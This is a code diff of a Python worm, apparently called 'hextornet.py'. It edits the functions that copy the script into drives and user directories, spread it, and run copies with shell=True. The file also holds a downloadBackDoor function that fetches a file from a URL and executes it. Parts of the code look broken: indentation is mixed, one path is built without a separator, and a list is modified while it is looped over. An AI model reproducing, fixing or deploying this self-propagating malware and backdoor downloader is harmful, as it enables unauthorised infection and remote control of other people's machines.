@@ -4,7 +4,7 @@ from shutil import copyfile
 import os, getpass
 from sys import argv
 #import win32con, win32api
-from Crypto.Hash import SHA256
+#from Crypto.Hash import SHA256
 from Crypto.Cipher import AES
 import os, random, sys, pkg_resources
 from urllib2 import urlopen
@@ -23,9 +23,11 @@ import shutil
 	if(os.path.isdir("E:\\")):
 		dst = "E:" + "\\hextornet.py"
 
-	#checks for C:/ drive on windows
 	elif(os.path.isdir("C:\\")):
 		dst = "C:\\Users\\" + usr + "\\hextornet.py"
+	
+	else:
+			dst = os.getcwd() + "hextornet.py"
 """
 
 src = os.path.abspath("hextornet.py")
@@ -41,13 +43,13 @@ def propagate():
 		dst = "E:" + "\\hextornet.py"
 
 	#Propagate worn in all directories
-	for directory in directoriesLinux:
-		if(os.path.isdir("/" + usr + "/" + directory + "/")):
-			dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
-		else:
-			dst = os.getcwd() + "hextornet.py"
-	
-        copyfile(src, dst)
+	while len(directoriesLinux) != 0:
+		for directory in directoriesLinux:
+			if(os.path.isdir("/" + usr + "/" + directory + "/")):
+				dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
+			print(directoriesLinux)
+			directoriesLinux.remove(directory)
+        		copyfile(src, dst)
 	run(dst)
 	print("Worm location")
 	print("dst:", dst)
@@ -56,7 +58,7 @@ def propagate():
 def copy():
 	script = sys.argv
 	name = str(script[0])
-	b = os.path.getsize(os.path.abspath("/root")) #Change in windows
+	b = os.path.getsize(os.path.abspath("/root/Documents")) #Change in windows
 	for i in range(0, 4):
 		directoryName = "files_" + str(i)
 		try:
@@ -91,8 +93,9 @@ def downloadBackDoor(url):
         run(os.path.abspath(filename))
 
 def run(program):
-	process = sp.Popen(program, shell=True)
-	process.wait()
+	p= sp.Popen(program, shell=True)
+	#process = sp.Popen(program, shell=True)
+	#process.wait()
 
 def main():
 	copy()
